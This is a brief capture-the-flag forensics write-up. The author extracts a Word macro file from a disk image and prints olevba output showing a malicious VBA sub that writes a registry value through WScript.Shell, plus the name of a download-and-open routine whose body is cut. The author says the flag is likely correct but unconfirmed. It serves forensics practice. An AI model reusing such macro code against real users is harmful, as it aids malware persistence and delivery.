# schmerz-1

**Flag:** `flag{fA3bDt}`

Extracting the filesystem from the `.ad1` file and going into the `C:\Users\challenge\Downloads` directory, we find a `.dotm` file. Running `olevba` on it, we get this

```
.
.
.
Sub RegistryEntry()
    Dim keyName As String
    Dim data As String
    Dim path As String
    Dim myWS As Object
    Dim stype As String
    Set myWS = VBA.CreateObject("WScript.Shell")

    path = "HKEY_CURRENT_USER\Software\Uninstall\"
    keyName = "Application"
    keyValue = "fA3bDt"
    stype = "REG_SZ"
    myWS.RegWrite path & keyName, keyValue, stype
End Sub

Sub DownloadAndOpenFile()
.
.
.
```

The value of the registry entry stored by the malicious macro seems to be `fA3bDt`. I can't confirm if this is correct as I couldn't find a writeup, but it most likely should be.

